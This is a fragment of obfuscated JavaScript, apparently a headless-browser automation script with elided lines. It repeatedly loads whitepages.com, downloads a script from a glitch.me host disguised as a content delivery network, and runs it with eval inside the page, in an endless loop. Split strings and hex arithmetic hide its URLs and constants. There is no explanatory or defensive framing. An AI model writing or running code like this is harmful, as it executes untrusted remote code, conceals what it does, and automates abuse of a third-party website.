((async () => {
  ...
  (async function g() {
    let h = 0x1251 + 0x21fa + 0x1 * -0x344b;
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1bd * -0x7 + 0x79c * -0x5 + 0x19e1), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(-0x336b * 0x5 + 0x1b5e70 + -0xca1b9), await j['close'](), await i['close'](), g());
  }());
})());